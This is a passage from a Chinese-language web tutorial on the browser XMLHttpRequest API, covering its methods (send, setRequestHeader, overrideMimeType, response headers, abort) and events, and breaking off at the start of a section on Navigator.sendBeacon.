function_">send</span>(data);</span><br></pre></td></tr></table></figure>

<p>注意，所有 XMLHttpRequest 的监听事件，都必须在<code>send()</code>方法调用之前设定。</p>
<p><code>send</code>方法的参数就是发送的数据。<strong>多种格式的数据，都可以作为它的参数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>();</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>(<span class="title class_">ArrayBufferView</span> data); <span class="comment">// 二进制数组</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>(<span class="title class_">Blob</span> data); <span class="comment">// 二进制大对象</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>(<span class="title class_">Document</span> data); <span class="comment">// 文档对象</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>(<span class="title class_">String</span> data); <span class="comment">// 字符串数据</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">send</span>(<span class="title class_">FormData</span> data); <span class="comment">// 表单数据？</span></span><br></pre></td></tr></table></figure>

<p>如果<code>send()</code>发送 DOM 对象，在发送之前，数据会先被串行化。<strong>如果发送二进制数据，最好是发送<code>ArrayBufferView</code>或<code>Blob</code>对象，这使得通过 Ajax 上传文件成为可能。</strong></p>
<p>下面是发送表单数据的例子。<code>FormData</code>对象可以用于构造表单数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;zhangsan@example.com&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;birthDate&#x27;</span>, <span class="number">1940</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(formData);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>FormData</code>对象构造了表单数据，然后使用<code>send()</code>方法发送。它的效果与发送下面的表单数据是一样的。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&#x27;registration&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;registration&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;/register&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;username&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;张三&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;email&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;email&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;zhangsan@example.com&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;number&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;birthDate&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;1940&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;return sendForm(this.form);&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面的例子是使用<code>FormData</code>对象加工表单数据，然后再发送。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sendForm</span>(<span class="params">form</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(form);</span><br><span class="line">  formData.<span class="title function_">append</span>(<span class="string">&#x27;csrf&#x27;</span>, <span class="string">&#x27;e69a18d7db1286040586e6da1950128c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, form.<span class="property">action</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  xhr.<span class="title function_">send</span>(formData);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#registration&#x27;</span>);</span><br><span class="line"><span class="title function_">sendForm</span>(form);</span><br></pre></td></tr></table></figure>



<h4 id="3-3-XMLHttpRequest-setRequestHeader-设置请求头"><a href="#3-3-XMLHttpRequest-setRequestHeader-设置请求头" class="headerlink" title="3.3 XMLHttpRequest.setRequestHeader() 设置请求头"></a>3.3 XMLHttpRequest.setRequestHeader() 设置请求头</h4><p><code>XMLHttpRequest.setRequestHeader()</code>方法用于<strong>设置浏览器发送的 HTTP 请求的头信息</strong>。该方法必须<strong>在<code>open()</code>之后、<code>send()</code>之前</strong>调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</p>
<p>该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Length&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data).<span class="property">length</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br></pre></td></tr></table></figure>

<p>上面代码首先设置头信息<code>Content-Type</code>，表示发送 JSON 格式的数据；然后设置<code>Content-Length</code>，表示数据长度；最后发送 JSON 数据。</p>
<h4 id="3-4-XMLHttpRequest-overrideMimeType-覆盖返回的MIME类型"><a href="#3-4-XMLHttpRequest-overrideMimeType-覆盖返回的MIME类型" class="headerlink" title="3.4 XMLHttpRequest.overrideMimeType() 覆盖返回的MIME类型"></a>3.4 XMLHttpRequest.overrideMimeType() 覆盖返回的MIME类型</h4><p><code>XMLHttpRequest.overrideMimeType()</code>方法<strong>用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型</strong>，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是<code>text/xml</code>，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成<code>text/plain</code>（普通文本），这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">overrideMimeType</span>(<span class="string">&#x27;text/plain&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>注意，该方法必须在<code>send()</code>方法之前调用。</strong></p>
<p>修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器，就像下面的例子。<strong>只有在服务器无法返回某种数据类型时，才使用<code>overrideMimeType()</code>方法。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> arraybuffer = xhr.<span class="property">response</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;arraybuffer&#x27;</span>;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>



<h4 id="3-5-XMLHttpRequest-getResponseHeader-获取响应头信息指定字段"><a href="#3-5-XMLHttpRequest-getResponseHeader-获取响应头信息指定字段" class="headerlink" title="3.5 XMLHttpRequest.getResponseHeader() 获取响应头信息指定字段"></a>3.5 XMLHttpRequest.getResponseHeader() 获取响应头信息指定字段</h4><p><code>XMLHttpRequest.getResponseHeader()</code>方法<strong>返回 HTTP 头信息指定字段的值，</strong>如果还没有收到服务器回应或者指定字段不存在，返回<code>null</code>。该方法的参数不区分大小写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getHeaderTime</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="title function_">getResponseHeader</span>(<span class="string">&quot;Last-Modified&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;HEAD&#x27;</span>, <span class="string">&#x27;yourpage.html&#x27;</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = getHeaderTime;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>

<p>如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。</p>
<h4 id="3-6-XMLHttpRequest-getAllResponseHeaders-获取全部头信息"><a href="#3-6-XMLHttpRequest-getAllResponseHeaders-获取全部头信息" class="headerlink" title="3.6 XMLHttpRequest.getAllResponseHeaders() 获取全部头信息"></a>3.6 XMLHttpRequest.getAllResponseHeaders() 获取全部头信息</h4><p><code>XMLHttpRequest.getAllResponseHeaders()</code>方法返回一个<strong>字符串</strong>，表示服务器发来的<strong>所有 HTTP 头信息</strong>。格式为字符串，每个头信息之间使用<code>CRLF</code>分隔（回车+换行），如果没有收到服务器回应，该属性为<code>null</code>。如果发生网络错误，该属性为空字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;foo.txt&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> headers = xhr.<span class="title function_">getAllResponseHeaders</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">date</span>: <span class="title class_">Fri</span>, <span class="number">08</span> <span class="title class_">Dec</span> <span class="number">2017</span> <span class="number">21</span>:<span class="number">04</span>:<span class="number">30</span> <span class="variable constant_">GMT</span>\r\n</span><br><span class="line">content-<span class="attr">encoding</span>: gzip\r\n</span><br><span class="line">x-content-type-<span class="attr">options</span>: nosniff\r\n</span><br><span class="line"><span class="attr">server</span>: meinheld/<span class="number">0.6</span><span class="number">.1</span>\r\n</span><br><span class="line">x-frame-<span class="attr">options</span>: <span class="variable constant_">DENY</span>\r\n</span><br><span class="line">content-<span class="attr">type</span>: text/html; charset=utf-<span class="number">8</span>\r\n</span><br><span class="line"><span class="attr">connection</span>: keep-alive\r\n</span><br><span class="line">strict-transport-<span class="attr">security</span>: max-age=<span class="number">63072000</span>\r\n</span><br><span class="line"><span class="attr">vary</span>: <span class="title class_">Cookie</span>, <span class="title class_">Accept</span>-<span class="title class_">Encoding</span>\r\n</span><br><span class="line">content-<span class="attr">length</span>: <span class="number">6502</span>\r\n</span><br><span class="line">x-xss-<span class="attr">protection</span>: <span class="number">1</span>; mode=block\r\n</span><br></pre></td></tr></table></figure>

<p>然后，对这个字符串进行处理。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = headers.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="regexp">/[\r\n]+/</span>);</span><br><span class="line"><span class="keyword">var</span> headerMap = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">arr.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">line</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> parts = line.<span class="title function_">split</span>(<span class="string">&#x27;: &#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> header = parts.<span class="title function_">shift</span>();</span><br><span class="line">  <span class="keyword">var</span> value = parts.<span class="title function_">join</span>(<span class="string">&#x27;: &#x27;</span>);</span><br><span class="line">  headerMap[header] = value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">headerMap[<span class="string">&#x27;content-length&#x27;</span>] <span class="comment">// &quot;6502&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-7-XMLHttpRequest-abort-终止请求"><a href="#3-7-XMLHttpRequest-abort-终止请求" class="headerlink" title="3.7 XMLHttpRequest.abort() 终止请求"></a>3.7 XMLHttpRequest.abort() 终止请求</h4><p><code>XMLHttpRequest.abort()</code>方法用来<strong>终止已经发出的 HTTP 请求</strong>。调用这个方法以后，<code>readyState</code>属性变为<code>4</code>，<code>status</code>属性变为<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.example.com/page.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr) &#123;</span><br><span class="line">    xhr.<span class="title function_">abort</span>();</span><br><span class="line">    xhr = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码在发出5秒之后，终止一个 AJAX 请求。</p>
<h3 id="4、XMLHttpRequest-实例的事件"><a href="#4、XMLHttpRequest-实例的事件" class="headerlink" title="4、XMLHttpRequest 实例的事件"></a>4、XMLHttpRequest 实例的事件</h3><h4 id="4-1-readyStateChange-事件-（状态改变事件）"><a href="#4-1-readyStateChange-事件-（状态改变事件）" class="headerlink" title="4.1 readyStateChange 事件 （状态改变事件）"></a>4.1 readyStateChange 事件 （状态改变事件）</h4><p><code>readyState</code>属性的值发生改变，就会触发 readyStateChange 事件。</p>
<p>我们可以通过<code>onReadyStateChange</code>属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为<code>4</code>的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。</p>
<h4 id="4-2-progress-事件-（请求中，进度事件）"><a href="#4-2-progress-事件-（请求中，进度事件）" class="headerlink" title="4.2 progress 事件 （请求中，进度事件）"></a>4.2 progress 事件 （请求中，进度事件）</h4><p>上传文件时，XMLHttpRequest 实例对象本身和实例的<code>upload</code>属性，都有一个<code>progress</code>事件，会不断返回上传的进度。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateProgress</span> (<span class="params">oEvent</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (oEvent.<span class="property">lengthComputable</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> percentComplete = oEvent.<span class="property">loaded</span> / oEvent.<span class="property">total</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;无法计算进展&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;progress&#x27;</span>, updateProgress);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>();</span><br></pre></td></tr></table></figure>



<h4 id="4-3-load-事件、error-事件、abort-事件-（请求完成，请求错误，请求终止）"><a href="#4-3-load-事件、error-事件、abort-事件-（请求完成，请求错误，请求终止）" class="headerlink" title="4.3 load 事件、error 事件、abort 事件 （请求完成，请求错误，请求终止）"></a>4.3 load 事件、error 事件、abort 事件 （请求完成，请求错误，请求终止）</h4><p>load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, transferComplete);</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, transferFailed);</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;abort&#x27;</span>, transferCanceled);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferComplete</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据接收完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferFailed</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据接收出错&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferCanceled</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户取消接收&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-4-loadend-事件-（请求结束，无论是否成功）"><a href="#4-4-loadend-事件-（请求结束，无论是否成功）" class="headerlink" title="4.4 loadend 事件 （请求结束，无论是否成功）"></a>4.4 loadend 事件 （请求结束，无论是否成功）</h4><p><code>abort</code>、<code>load</code>和<code>error</code>这三个事件，会伴随一个<code>loadend</code>事件，表示请求结束，但不知道其是否成功。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, loadEnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadEnd</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;请求结束，状态未知&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-5-timeout-事件（请求超时）"><a href="#4-5-timeout-事件（请求超时）" class="headerlink" title="4.5 timeout 事件（请求超时）"></a>4.5 timeout 事件（请求超时）</h4><p>服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见<code>timeout</code>属性一节。</p>
<h3 id="5、Navigator-sendBeacon-卸载网页时发送数据"><a href="#5、Navigator-sendBeacon-卸载网页时发送数据" class="headerlink" title="5、Navigator.sendBeacon() 卸载网页时发送数据"></a>5、Navigator.sendBeacon() 卸载网页时发送数据</h3><p>用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在<code>unload</code>事件或<code>beforeunload</code>事件的监听函数里面，使用<code>XMLHttpRequest</code>对象发送数据。但是，这样做不是很可靠，因为<code>XMLHttpRequest</code>对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。</p>
<p>解决方法就是<code>unload</code>事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/log&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">  xhr.<span class="title function_">send</span>(<span class="string">&#x27;foo=bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="title function_">log</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// a time-consuming operation</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> m = <span class="number">1</span>; m &lt; <span class="number">10000</span>; m++) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，强制执行了一次双重循环，拖长了<code>unload</code>事件的执行时间，导致异步 AJAX 能够发送成功。</p>
<p>类似的还可以使用<code>setTimeout</code>。下面是追踪用户点击的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;a id=&quot;target&quot; href=&quot;https://baidu.com&quot;&gt;click&lt;/a&gt;</span></span><br><span class="line"><span class="keyword">const</span> clickTime = <span class="number">350</span>;</span><br><span class="line"><span class="keyword">const</span> theLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;target&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/log&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">  xhr.<span class="title function_">send</span>(<span class="string">&#x27;foo=bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">theLink.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="title function_">log</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = theLink.<span class="title function_">getAttribute</span>(<span class="string">&#x27;href&#x27;</span>);</span><br><span class="line">  &#125;, clickTime);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码使用<code>setTimeout</code>，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。</p>
<p>这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。</p>
<p>为了解决这个问题，浏览器引入了<code>Navigator.sendBeacon()</code>方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此<strong>可以保证会把数据发出去，不拖延卸载流程</strong>。</p>
